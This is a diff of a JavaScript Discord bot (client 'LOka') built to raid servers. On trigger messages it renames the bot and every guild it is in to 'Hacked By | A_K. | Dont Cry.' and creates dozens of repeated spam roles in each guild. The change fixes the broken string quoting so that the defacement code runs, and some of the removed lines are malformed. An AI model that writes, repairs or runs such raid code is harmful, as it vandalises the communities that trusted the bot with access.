@@ -39,7 +39,7 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/3
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked By |"  A_K. "| Dont Cry.")
+LOka.user.setUsername("Hacked By |  A_K. | Dont Cry.")
  
 }
 });
@@ -60,7 +60,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked By |"  A_K. "| Dont Cry.`)
+             m.setName(`Hacked By |  A_K. | Dont Cry.`)
 })
 }
 });
@@ -80,202 +80,150 @@ LOka.on('message', message => {
      if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-          name : "Hacked By |"  A_K. "| Dont Cry.",
-          permissions :   [1],
-          color : " #ff0000"
-      })
-    m.createRole({
-      m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })           
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hacked By |"  A_K. "| Dont Cry.",
+        name : "Hacked By |  A_K. | Dont Cry.",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+  m.createRole({
+        name : "Hacked By |  A_K. | Dont Cry.",
+        permissions :   [1],
+        color : " #ff0000"
+    })
   
  
  
